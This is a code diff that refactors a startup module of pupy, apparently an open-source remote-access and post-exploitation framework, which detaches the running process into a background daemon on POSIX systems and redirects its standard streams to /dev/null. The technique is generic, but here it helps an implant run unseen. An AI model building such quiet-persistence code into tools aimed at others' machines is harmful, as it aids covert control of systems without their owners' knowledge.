@@ -1,23 +1,26 @@
 # -*- coding: utf-8 -*-
 
-''' daemonize the process at startup (posix only) '''
+''' Daemonize the process at startup (posix only) '''
 
-import pupy, os
+__compatibility__ = ('linux', 'posix', 'unix')
+
+from pupy import infos
+from os import fork, _exit, umask, name, setsid, dup2
 
 def main():
-    if os.name == 'posix':
-        pupy.infos['daemonize']=True
-        if os.fork():   # launch child and...
-            os._exit(0) # kill off parent
-        os.setsid()
-        if os.fork():   # launch child and...
-            os._exit(0) # kill off parent again.
-        os.umask(022)   # Don't allow others to write
-        null=os.open('/dev/null', os.O_RDWR)
+    if name == 'posix':
+        infos['daemonize'] = True
+        if fork():   # launch child and...
+            _exit(0) # kill off parent
+        setsid()
+        if fork():   # launch child and...
+            _exit(0) # kill off parent again.
+        umask(022)   # Don't allow others to write
+        null = open('/dev/null', 'w+')
         for i in range(3):
             try:
-                os.dup2(null, i)
-            except OSError, e:
-                if e.errno != errno.EBADF:
-                    raise
-        os.close(null)
+                dup2(null.fileno(), i)
+            except OSError:
+                pass
+
+        null.close()
